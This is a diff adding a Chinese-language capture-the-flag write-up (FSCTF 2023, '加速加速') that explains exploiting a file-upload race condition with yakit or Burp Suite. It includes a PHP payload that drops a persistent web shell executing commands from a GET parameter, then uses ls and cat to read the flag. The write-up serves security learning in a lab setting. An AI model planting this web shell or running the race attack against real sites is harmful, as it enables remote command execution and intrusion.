@@ -517,4 +517,27 @@ data = {"id": "wllmNB"}  # 传递 POST 参数
 response = requests.post(url, params=params, data=data)
 print(response.text)  # 期待返回 flag
 ```
+## [FSCTF 2023]加速加速
 
+https://www.nssctf.cn/problem/4629
+
+* 考点：条件竞争
+* 工具：yakit/burpsuit
+
+文件再上传到upload目录后才进行条件判定，当不符合条件就会被删除，但是这个过程中可以执行上传的还没有来得及删掉的代码
+
+先抓包分别获取get和排post请求包以便后续修改
+
+post中替换请求体为：
+
+```php
+<?php file_put_contents('succ.php', '<?php system($_GET["cmd"]); ?>'); ?>
+```
+
+通过yakit多线程上传10000次，然后另开一个fuzz进行多个get请求获取上传的php去执行
+
+然后在网页端对cmd变量进行操作，`ls` 查询到 flag 是在根目录下，直接`cat`获取
+
+![](./img/加速加速竞争获取flag.png)
+
+---
